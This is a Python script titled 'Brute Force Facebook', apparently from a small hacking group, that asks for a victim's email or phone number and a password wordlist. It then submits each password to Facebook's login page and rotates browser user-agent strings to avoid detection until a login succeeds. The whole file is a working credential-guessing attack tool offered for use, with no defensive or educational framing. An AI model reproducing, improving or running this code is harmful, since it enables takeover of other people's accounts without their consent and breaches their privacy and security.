#!/usr/bin/python
# coding=utf-8
# Brute Force Facebook
# Elite Security Team
# Email: aouati.haitem@gmail.com
# https://www.facebook.com/elite.secu/
# Programming by Haitem Aouati Or ./root
#

import requests as r
from termcolor import colored
import random
import time as t

print('''

                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~

Brute Force Facebook, Programming by ./root
https://www.facebook.com/haitem.aouati.dz
''')

url = 'https://www.facebook.com/login.php'
login = str(raw_input("\033[92m Enter a Email or phone number or ID of the victim \n \033[93m [#] Email: ")) 
def list():
   global wordlist
   wordlist =  str(raw_input("\033[92m Enter the name of the password list \033[94m [wordlist.txt] \n \033[93m [#] Wordlist: "))
   try:
     global  passw 
     passw = open(wordlist,'r').readlines()
   except FileNotFoundError:
       print('File Not Found, Try Again')
       list()
list()

try:
    passw = open(wordlist,'r').readlines()
except FileNotFoundError:
    print('File Not Found, Try Again')
    list()

agents = [
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.3',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1'
]

headers = {'Cookie':'locale=es_LA'}                                                                 
headers['User-Agent'] = random.choice(agents) 
headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
headers['Content-type'] = "application/x-www-form-urlencoded"
headers['Accept-Charset'] = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
s = r.Session()
print('\n\n \033[94m Start Cracking...')

for line in passw:
    t.sleep(0.5)
    pwd = line.strip()
    usr_data = {}
    usr_data['email'] = login
    usr_data['pass'] =  pwd
    usr_data['login'] = 'Entrar'
    usr_data['timezone'] = 360
    usr_data['return_session'] = 0
    usr_data['session_key_only'] = 0
    usr_data['legacy_return'] = 1
    usr_data['trynum'] = 1
    usr_data['display'] = ''
    usr_data['persistent'] = 1
    usr_data['default_persistent'] = 1
    usr_data['ajax'] = 'ajax'
     
    s = r.Session()
    res = s.post(url, data=usr_data, headers=headers)
    if res.url != "https://www.facebook.com/login.php":
        print ("\n\n \033[94m [+] Password Has Been Found\n\n \033[92m [+] Password: " + pwd )
        break
    else:
        print ("\033[91m [-] Wrong Password: " + pwd)
        headers['User-Agent'] = random.choice(agents)

